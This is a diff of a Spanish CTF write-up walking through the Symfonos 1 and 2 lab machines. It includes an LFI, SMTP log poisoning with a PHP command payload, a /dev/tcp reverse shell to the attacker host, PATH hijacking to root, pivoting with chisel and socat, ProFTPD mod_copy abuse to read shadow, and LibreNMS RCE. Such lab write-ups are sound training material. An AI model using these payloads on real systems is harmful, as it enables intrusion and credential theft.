@@ -4,7 +4,7 @@ date: '2023-01-15'
 tags: []
 draft: false
 authors: ['default']
-summary: 'En este artículo se describen las máquinas CTF de Capture The Flag "Symfonos 1" y "Symfonos 2". El desafío consiste en encontrar vulnerabilidades y explotarlas para obtener acceso a los sistemas. En Symfonos 1, se explotan las vulnerabilidades de Log Poisoning, Path Hijacking, FTP, y un plugin de Wordpress llamado Mail Masta. En Symfonos 2, se explotan las vulnerabilidades de LibreNMS y ProFTPD. Se utilizan técnicas como pivoting y fuerza bruta para escalar privilegios.'
+summary: 'La máquina Symfonos 1 es un reto CTF que consiste en aprovechar diversas vulnerabilidades como **smbmap**, **Path Hijacking**, **Log Poisoning**, y una vulnerabilidad de **FTP** y **LibreNMS** para lograr obtener acceso a la máquina y escalar privilegios.'
 images: ["/static/images/uploads/symfonos-1-y-2-write-up/Symfonos-1.webp", "/static/images/uploads/symfonos-1-y-2-write-up/Symfonos-Network.svg", "/static/images/uploads/symfonos-1-y-2-write-up/Helios-Wordpress.webp", "/static/images/uploads/symfonos-1-y-2-write-up/Symfonos-Proxychains.svg", "/static/images/uploads/symfonos-1-y-2-write-up/LibreNMS.webp", "/static/images/uploads/symfonos-1-y-2-write-up/LibreNMS-Logged.webp"]
 ---
 
@@ -14,11 +14,9 @@ Máquinas **easy** y **medium**, donde aprovechamos la técnica del **pivoting**
 
 ![](/static/images/uploads/symfonos-1-y-2-write-up/Symfonos-Network.svg)
 
-Symfonos 1
-==========
+# Symfonos 1
 
-Primeros pasos
---------------
+## Primeros pasos
 
 En este caso, desconocemos la IP de la máquina. Lo primero que vamos a hacer es recoger los host visibles desde mi equipo cacheados en la tabla ARP. Una alternativa sería utilizar **ArpScan**.
 
@@ -45,8 +43,9 @@ ping -c 1 192.168.1.140 -R
 #	    192.168.1.138
 
 ```
-⚠️TTL~64 - LinuxReconocimiento
---------------
+⚠️TTL~64 - Linux
+
+## Reconocimiento
 
 Mediante **nmap** escaneamos los puertos abiertos.
 
@@ -54,14 +53,12 @@ Mediante **nmap** escaneamos los puertos abiertos.
 ```
 nmap -p- -sS -vvv --open -n -Pn --min-rate 5000 192.168.1.140 -oG allPorts
 # Open ports: 22,25,80,139,445
-
 ```
 Afinamos la búsqueda una vez conocidos los puertos abiertos.
 
 
 ```
 nmap -p22,25,80,139,445 -sCV 192.168.1.140 -oN targeted
-
 ```
 Y vemos el archivo targeted para mirar un poco el resultado.
 
@@ -81,7 +78,6 @@ PORT    STATE SERVICE     VERSION
 445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
 MAC Address: 08:00:27:5A:60:B1 (Oracle VirtualBox virtual NIC)
 ...
-
 ```
 He omitido el output para quedarme con lo interesante. Servicios de **ssh**, **smtp**, **http** y **smb** expuestos.
 
@@ -107,7 +103,6 @@ smbmap -H 192.168.1.140 -r anonymous
 smbmap -H 192.168.1.140 --download anonymous/attention.txt
 # [+] Starting download: anonymous\attention.txt (154 bytes)
 # [+] File output to: /home/iocio/Desktop/VulnHub/Symfonos1/content/192.168.1.140-anonymous_attention.txt
-
 ```
 Si cateamos el archivo de texto obtenemos lo siguiente.
 
@@ -118,7 +113,6 @@ Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'!
 Next person I find using one of these passwords will be fired!
 
 -Zeus
-
 ```
 Cosas interesantes hasta aquí, de atrás adelante.
 
@@ -135,7 +129,6 @@ smbmap -H 192.168.1.140 -u helios -p qwerty
 #   	print$                                            	READ ONLY	Printer Drivers
 #   	helios                                            	READ ONLY	Helios personal #   	anonymous                                         	READ ONLY	
 #   	IPC$                                              	NO ACCESS	IPC Service
-
 ```
 Tirando del hilo como anteriormente, he encontrado dos archivos. Un research.txt y un todo.txt.  
 El texto de todo.txt es el siguiente.
@@ -145,14 +138,12 @@ El texto de todo.txt es el siguiente.
 1. Binge watch Dexter
 2. Dance
 3. Work on /h3l105
-
 ```
 El tercer punto parece un directorio o una ruta. Si accedo por Firefox a la web expuesta y pongo esa ruta, vemos un servidor Wordpress. Coloco la siguiente entrada en `/etc/hosts` para que los archivos estáticos se descarguen correctamente y poderlo visualizar correctamente.
 
 
 ```
 192.168.1.140    symfonos.local
-
 ```
 ![](/static/images/uploads/symfonos-1-y-2-write-up/Helios-Wordpress.webp)
 
@@ -165,7 +156,6 @@ Con la salida de curl, concatenando varios greps y algunos delimitadores, obtene
 curl -X get 192.168.1.140/h3l105/ | grep 'wp-content' | grep -oP "'.*?'" | grep symfonos.local | cut -d '/' -f 1-7 | sort -u | grep plugins
 # 'http://symfonos.local/h3l105/wp-content/plugins/mail-masta
 # 'http://symfonos.local/h3l105/wp-content/plugins/site-editor
-
 ```
 Hay un plugin de mails y otro bastante común para la edición del sitio. Recordamos que la máquina tiene expuesto el puerto de 25 SMTP. Vamos a ir por ese camino.
 
@@ -175,7 +165,6 @@ Buscamos vulnerabilidades en **searchsploit**.
 ```
 searchsploit mail masta
 # WordPress Plugin Mail Masta 1.0 - Local File Inclusion (2)                                                                                                  | php/webapps/50226.py
-
 ```
 El plugin Mail Masta tiene una vulnerabilidad de tipo LFI.  
 Mirando el script, vemos que la vulnerabilidad se encuentra en una URL. Vamos a probarlo manualmente con curl.
@@ -185,19 +174,18 @@ Mirando el script, vemos que la vulnerabilidad se encuentra en una URL. Vamos a 
 curl -X GET "http://192.168.1.140/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
 # root:x:0:0:root:/root:/bin/bash
 # helios:x:1000:1000:,,,:/home/helios:/bin/bash 
-
 ```
 Podemos desarrollar un script para hacer más sencillas las consultas como [[lfi\_read\_file.sh]]  
+
 Un directorio interesante continuando con el tema de **smtp**, es `/var/mail/`.  
+
 Con ayuda del script, vemos dicho archivo.
 
 
 ```
 ./lfi_read_file.sh -f /var/mail/helios
-
 ```
-Log Poisoning de SMTP
----------------------
+## Log Poisoning de SMTP
 
 El directorio */var/mail/helios* está expuesto. Si fuésemos capaces de enviar un mail y colar código PHP en él, podríamos mediante el **LFI** transformarlo en un **RCE** fácilmente.
 
@@ -219,7 +207,6 @@ php system($\_GET['cmd']) ?
 .
 # 250 2.0.0 Ok: queued as 9ACCB4083E
 quit
-
 ```
 De este modo, vamos a entablarnos una reverse shell.
 
@@ -228,13 +215,11 @@ De este modo, vamos a entablarnos una reverse shell.
 # attacker
 sudo nc -lvnp 443
 listening on [any] 443 ...
-
 ```
 
 ```
 # vulnerable machine
 curl -vs -X GET "http://192.168.1.140/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=%2Fbin%2Fbash+-c+%22sh+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.1.138%2F443+0%3E%261%22"
-
 ```
 
 ```
@@ -245,10 +230,8 @@ connect to [192.168.1.138] from (UNKNOWN) [192.168.1.140] 54028
 sh: 0: can't access tty; job control turned off
 $ whoami
 helios
-
 ```
-Symfonos 1: Escalado
---------------------
+## Symfonos 1: Escalado
 
 Buscamos archivos SUID que permitan ejecutar código con permisos root.
 
@@ -269,7 +252,6 @@ find \-perm -4000 2/dev/null
 # ./bin/bash
 # ./bin/su
 # ./bin/ping
-
 ```
 Llama la atención el archivo */opt/statuscheck*. Vamos a inspeccionarlo más
 
@@ -285,26 +267,22 @@ strings /opt/statuscheck
 # AWAVA
 # AUATL
 # ...
-
 ```
 Hace uso del comando curl de forma relativa. Vamos a aplicar **Path Hijacking**.
 
-Path Hijacking
---------------
+## Path Hijacking
 
 Creamos un archivo en la carpeta `/tmp` llamado curl, hacemos que ejecute el siguiente comando para darle privilegios **SUID** a */bin/bash*.
 
 
 ```
 chmod u+s /bin/bash
-
 ```
 Añadimos `/tmp` dentro de la variable *$PATH* asignándole prioridad.
 
 
 ```
 export PATH=/tmp:$PATH
-
 ```
 Y ejecutamos el archivo *statuscheck*. Posteriormente, llamamos a */bin/bash* con *-p* para lanzarlo con modo privilegiado.
 
@@ -314,7 +292,6 @@ sudo /opt/statuscheck
 /bin/bash -p
 whoami
 # root
-
 ```
 Vamos a enumerar las interfaces que tiene activas.
 
@@ -322,7 +299,6 @@ Vamos a enumerar las interfaces que tiene activas.
 ```
 hostname -I
 10.10.10.4 192.168.1.140
-
 ```
 La interfaz 10.10.10.4 era desconocida hasta ahora. Vamos a mirar su tabla **ARP**.
 
@@ -335,19 +311,16 @@ IP address       HW type     Flags       HW address            Mask     Device
 192.168.1.138    0x1         0x2         08:00:27:40:1b:d1     *        enp0s17
 192.168.1.1      0x1         0x2         b0:8b:92:fa:45:dc     *        enp0s17
 192.168.1.136    0x1         0x2         68:b6:91:4e:42:0c     *        enp0s17
-
 ```
 Ahí está el host 10.10.10.3 correspondiente a Symfonos 2. A partir de aquí podríamos enumerar los host y puertos con un script, pero vamos a continuar directamente con la máquina Symfonos 2.
 
-Symfonos 2
-==========
+# Symfonos 2
 
 El procedimiento a continuación es entablar una comunicación desde nuestro equipo atacante, a la red *10.10.10.0/24* pasando por la máquina **Symfonos 1**.
 
 ![](/static/images/uploads/symfonos-1-y-2-write-up/Symfonos-Proxychains.svg)
 
-Entablamos la comunicación
---------------------------
+## Entablamos la comunicación
 
 Nos descargamos **Chisel** desde su [Github](https://github.com/jpillora/chisel/releases) con **wget**, y lo compartimos con **Symfonos 1**.
 
@@ -357,21 +330,18 @@ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_li
 gunzip chisel_1.7.7_linux_amd64.gz
 mv chisel_1.7.7_linux_amd64 chisel
 python -m http.server 8080
-
 ```
 Y lo compartimos con **Symfonos 1**.
 
 
 ```
 wget 192.168.1.138:8080/chisel
-
 ```
 Arrancamos **chisel** en modo servidor en nuestra máquina atacante.
 
 
 ```
 chisel server --reverse -p 1234
-
 ```
 Y desde **Symfonos 1**, entablamos la comunicación con **Socks5**.
 
@@ -380,7 +350,6 @@ Y desde **Symfonos 1**, entablamos la comunicación con **Socks5**.
 chisel client 192.168.1.138:1234 R:socks
 # When connection is stablished, chisel server output
 # 2023/01/13 23:32:12 server: session#3: tun: proxy#R:127.0.0.1:1080=socks: Listening
-
 ```
 Por último, en nuestra máquina atacante, debemos configurar **Proxychains** para que sea capaz de tunelizar las peticiones a través de **Symfonos 1**.
 
@@ -393,19 +362,18 @@ nano /etc/proxychains.conf
 # defaults set to "tor"
 #socks4     127.0.0.1 9050
 socks5 127.0.0.1 1080 # this port depends on Chisel result
-
 ```
-Enumeración de Symfonos 2
--------------------------
+## Enumeración de Symfonos 2
 
 Ejecutamos **nmap** como al inicio, wrappeando la comunicación a través de **Proxychains**.
 
 
 ```
 proxychains nmap --top-ports 50 -sT -vvv --open -n -Pn --min-rate 5000 10.10.10.3 -oG allPorts 2&1 | grep -vE "timeout|OK"
-
 ```
-⚠️Recuerda que con **Proxychains**, no se puede utilizar la opción *-sS* porque entra en conflicto con el túnel. Hay que cambiar el parámetro a *-sT* para utilizar peticiones TCP normales.Se concatenan además unos comandos de limpieza porque **Proxychains** imprime más contenido del deseado. Los puertos abiertos son los siguientes: 21, 22, 80, 139, 445.
+> ⚠️Recuerda que con **Proxychains**, no se puede utilizar la opción *-sS* porque entra en conflicto con el túnel. Hay que cambiar el parámetro a *-sT* para utilizar peticiones TCP normales.
+
+Se concatenan además unos comandos de limpieza porque **Proxychains** imprime más contenido del deseado. Los puertos abiertos son los siguientes: 21, 22, 80, 139, 445.
 
 Afinamos la búsqueda.
 
@@ -419,14 +387,12 @@ proxychains nmap -p21,22,80,139,445 --open -T5 -v -n -sTV -Pn 10.10.10.3 -oN tar
 # 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 # 445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 # Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
 ```
 Si nos comunicamos con Samba, vemos de nuevo que el acceso anónimo está permitido y nos encontramos un archivo log.txt que parece interesante.
 
 
 ```
 proxychains smbmap -H 10.10.10.3 --download anonymous/backups/log.txt
-
 ```
 Si lo examinamos, nos encontramos con lo siguiente (se han omitido cosas que no eran interesantes).
 
@@ -452,7 +418,6 @@ root@symfonos2:~# cat /etc/samba/smb.conf
 User				aeolus
 Group				aeolus
 ...
-
 ```
 * Existe una copia del *shadow* en */var/backups/shadow.bak*.
 * Existe el usuario **aeolus**
@@ -462,8 +427,7 @@ A través de **smb** no se puede hacer nada más.
 
 Continuamos por **FTP** en el puerto 21.
 
-ProFTPD 1.3.5 exploit
----------------------
+## ProFTPD 1.3.5 exploit
 
 **Searchsploit** nos arroja información sobre esta versión de **ftp**. Parece ser vulnerable
 
@@ -475,7 +439,6 @@ searchsploit -x linux/remote/36742.txt
 # Description TJ Saunders 2015-04-07 16:35:03 UTC
 # Vadim Melihow reported a critical issue with proftpd installations that use the
 # mod_copy module's SITE CPFR/SITE CPTO commands; mod_copy allows these commands to be used by *unauthenticated clients*:
-
 ```
 Podemos copiar y pegar archivos de forma remota. Teniendo en cuenta que por **SMB** somos capaces de leer el directorio */home/aeolus/share*, podemos aprovechar esto para copiar ahí el backup del archivo */etc/shadow*.
 
@@ -494,26 +457,22 @@ ftp site CPFR /var/backups/shadow.bak
 ftp site CPTO /home/aeolus/share/shadow
 # 250 Copy successful
 quit
-
 ```
 Ya estamos listos para descargarnos el archivo con **smb**.
 
 
 ```
 proxychains smbmap -H 10.10.10.3 --download anonymous/shadow
-
 ```
 Vamos a probar con un poco de fuerza bruta, a ver si somos capaces de descifrar los hashes.
 
-JohnTheRipper  Shadow
-----------------------
+## JohnTheRipper  Shadow
 
 
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt shadow
 john --show shadow
 # aeolus:sergioteamo:18095:0:99999:7:::
-
 ```
 Parece que tenemos la contraseña del usuario `aeolus`, `sergioteamo`.
 
@@ -524,12 +483,10 @@ aeolus@symfonos2:~$ whoami
 # aeolus
 aeolus@symfonos2:~$ hostname -I
 # 10.10.10.3
-
 ```
 Estamos dentro de la máquina **Symfonos 2**.
 
-Symfonos 2: Escalado
---------------------
+## Symfonos 2: Escalado
 
 Con el comando `ss`, buscamos conexiones de red expuestas.
 
@@ -540,7 +497,6 @@ ss -tulpn
 # ...
 # tcp    LISTEN     0      128                                         127.0.0.1:8080
 # ...
-
 ```
 Parece ser que hay algo expuesto en el puerto 8080 del *localhost* de la máquina **Symfonos 2**.  
 Para poder acceder a ella, necesitamos redireccionar en nuestro equipo dicho puerto mediante un túnel **SSH**.
@@ -550,7 +506,6 @@ Con el siguiente comando vamos a ello.
 
 ```
 proxychains ssh -L 8080:127.0.0.1:8080 aeolus@10.10.10.3
-
 ```
 Una vez hecho esto, abrimos **firefox** y accedemos a [*http://localhost:8080*](http://localhost:8080).
 
@@ -566,7 +521,6 @@ Una vez dentro, buscamos alguna vulnerabilidad en este **CMS**.
 ```
 searchsploit librenms
 # LibreNMS 1.46 - 'addhost' Remote Code Execution                  php/webapps/47044.py
-
 ```
 El script genera un **RCE** por SNMP cuando crea un dispositivo. Con ayuda de él y poniéndonos en escucha desde **Symfonos 1**.
 
@@ -574,7 +528,6 @@ El script genera un **RCE** por SNMP cuando crea un dispositivo. Con ayuda de é
 ```
 $ whoami
 # cronus
-
 ```
 Pero vamos a complicarlo un poco más. Vamos a entablar una reverse shell hacia mi máquina atacante. Para ello, haremos uso de Socat.
 
@@ -583,7 +536,6 @@ Desde **Symfonos 1**, ejecutamos el siguiente comando.
 
 ```
 socat TCP-LISTEN:4646,fork TCP:192.168.1.138:4646
-
 ```
 De esta manera, lo que haremos desde **Symfonos 1**, es que todo el tráfico que le llegue por el puerto 4646, lo redirigirá automáticamente al host *192.168.1.138*, que es el de mi máquina atacante.
 
@@ -595,7 +547,6 @@ nc -lvnp 4646
 # /bin/sh: 0: can't access tty; job control turned off
 $ whoami
 cronus
-
 ```
 Adecuamos la TTY con un [tratamiento](https://ironhackers.es/tutoriales/como-conseguir-tty-totalmente-interactiva/) para poder utilizar el Ctrl+C, Ctrl+L y las flechas durante la sesión de la shell.
 
@@ -609,7 +560,6 @@ sudo -l
 #     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 # User cronus may run the following commands on symfonos2:
 #     (root) NOPASSWD: /usr/bin/mysql
-
 ```
 Cuando encontramos este tipo de permisos, conviene visitar [https://gtfobins.github.io/](https://gtfobins.github.io/gtfobins/mysql/#sudo) a ver si, de alguna manera, podemos acceder a la consola de root directamente.
 
@@ -649,5 +599,4 @@ cat /root/proof.txt
 /` . `  ,  . ~ , \  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,
 
 	Contact me via Twitter @zayotic to give feedback!
-
 ```
